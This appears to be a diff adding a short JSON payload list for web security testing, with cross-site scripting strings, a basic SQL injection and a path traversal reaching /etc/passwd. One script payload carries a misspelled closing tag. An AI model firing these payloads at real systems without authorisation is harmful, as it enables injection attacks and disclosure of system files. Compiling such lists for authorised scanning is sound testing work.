@@ -1,0 +1,14 @@
+{
+    "XSS": {
+        "img" : "\"><img/src=x onerror=alert(document.domain)",
+        "script" : "\"><script>alert(document.domain)</scirpt>",
+        "url" : "javascript:http://example.com/%0aalert%281%29",
+        "<!--" : "<!-- hoge=\"--><img src=x onerror=alert(1)\" -->"
+    },
+    "SQLi": {
+        "basic" : "' OR 1=1 --'"
+    },
+    "Path": {
+        "/etc/passwd" : "../../../../../../../../../../../../etc/passwd"
+    }
+}
